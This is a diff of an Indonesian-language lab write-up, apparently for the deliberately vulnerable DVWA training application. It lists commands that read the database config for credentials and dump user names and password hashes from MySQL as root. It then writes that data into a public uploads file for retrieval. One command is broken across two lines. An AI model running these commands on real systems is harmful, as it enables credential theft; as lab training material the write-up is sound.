@@ -124,9 +124,27 @@ Alamat penyerang (backtrack)
 - grep "db_" /var/www/dvwa/config/config.inc.php
 - echo "use dvwa; show tables;" | mysql -uroot 
 - echo "use dvwa; desc users;" | mysql -uroot 
-- echo "select user, from dvwa.users;" | mysql -uroot
+
 ![alt text](./29.PNG)
+- echo "select user,password  from dvwa.users;" | mysql -uroot
 ![alt text](./30.PNG)
+
+- buka terminal lagi
+- masukkan command :
+
+    `echo "<pre>" >> /var/www/dvwa/hackable/uploads/xss.html`
+
+    `echo "select user,password from dvwa.users;" | mysql -uroot>> /var/www/dvwa/hackable/uploads/xss.html`
+
+    `echo "</pre>" >> /var/www/dvwa/hackable/uploads/xss.html`
+
+    `echo "<br>Anindita<br>" >> `
+
+    `/var/www/dvwa/hackable/uploads/xss.html`
+    
+    `date >> /var/www/dvwa/hackable/uploads/xss.html`
+  
+
 ![alt text](./31.PNG)
 
 
